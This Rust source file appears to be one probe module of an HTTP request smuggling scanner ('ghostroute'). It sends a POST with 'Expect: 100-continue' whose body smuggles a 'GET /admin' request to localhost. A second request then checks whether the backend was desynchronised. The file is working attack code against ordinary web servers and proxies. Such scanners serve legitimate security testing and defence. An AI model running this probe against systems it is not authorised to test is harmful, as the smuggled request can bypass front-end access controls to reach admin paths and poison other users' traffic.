use crate::auth::AuthStore;
use crate::net::{h1, NetConfig};
use crate::output::ScanResult;

pub async fn probe(
    cfg: &NetConfig,
    auth: Option<&AuthStore>,
    _silent: &bool,
) -> Result<ScanResult, String> {
    let host = &cfg.host;

    let baseline_req = h1::build_request("GET", "/", host, &[], b"");
    let baseline = h1::send_request(cfg, &baseline_req, auth).await?;

    // Expect: 100-continue smuggling:
    // Send Expect: 100-continue with a smuggled body prefix.
    // After receiving 100 Continue from frontend, the smuggled content may poison the backend.

    let smuggled_body = b"GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n";

    let mut request = format!(
        "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: {}\r\nExpect: 100-continue\r\nUser-Agent: ghostroute/{}\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n",
        host, smuggled_body.len(), env!("CARGO_PKG_VERSION")
    );

    if let Some(a) = auth {
        let mut bytes = request.into_bytes();
        a.apply_to_request(&mut bytes);
        request = String::from_utf8(bytes).map_err(|e| e.to_string())?;
    }

    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::time::timeout;
    use std::time::Duration;

    let mut conn = crate::net::connect(cfg).await?;

    // Send headers, wait for 100 Continue
    conn.write_all(request.as_bytes()).await.ok();

    // Read 100 Continue response
    let mut buf = Vec::with_capacity(4096);
    let mut tmp = [0u8; 8192];
    loop {
        match timeout(Duration::from_secs(cfg.timeout.as_secs()), conn.read(&mut tmp)).await {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => buf.extend_from_slice(&tmp[..n]),
            Ok(Err(_)) => break,
            Err(_) => break,
        }
        if buf.len() > 1_000_000 { break; }
        if buf.windows(4).any(|w| w == b"\r\n\r\n") { break; }
    }

    // Send the body (with smuggled prefix)
    conn.write_all(smuggled_body).await.ok();

    // Read final response
    let mut buf_final = Vec::with_capacity(4096);
    loop {
        match timeout(Duration::from_secs(cfg.timeout.as_secs()), conn.read(&mut tmp)).await {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => buf_final.extend_from_slice(&tmp[..n]),
            Ok(Err(_)) => break,
            Err(_) => break,
        }
        if buf_final.len() > 1_000_000 { break; }
    }

    let _final_resp = h1::parse_response(&buf_final).unwrap_or_else(|_| baseline.clone());

    // Send second request
    let second_req = h1::build_request("GET", "/", host, &[], b"");
    conn.write_all(&second_req).await.ok();

    let mut buf2 = Vec::with_capacity(4096);
    loop {
        match timeout(Duration::from_secs(cfg.timeout.as_secs()), conn.read(&mut tmp)).await {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => buf2.extend_from_slice(&tmp[..n]),
            Ok(Err(_)) => break,
            Err(_) => break,
        }
        if buf2.len() > 1_000_000 { break; }
    }

    let second_resp = h1::parse_response(&buf2).unwrap_or_else(|_| baseline.clone());
    let vulnerable = second_resp.body != baseline.body || second_resp.status_code != baseline.status_code;

    let host_name = &cfg.host;
    Ok(ScanResult {
        host: host_name.to_string(),
        port: cfg.port,
        variant: "expect100".to_string(),
        vulnerable,
        server: baseline.server.clone(),
        bypass: None,
        status_code: second_resp.status_code,
        details: if vulnerable {
            Some("Expect:100-continue smuggling: 100-handler allowed desync".into())
        } else {
            None
        },
        ..Default::default()
    })
}
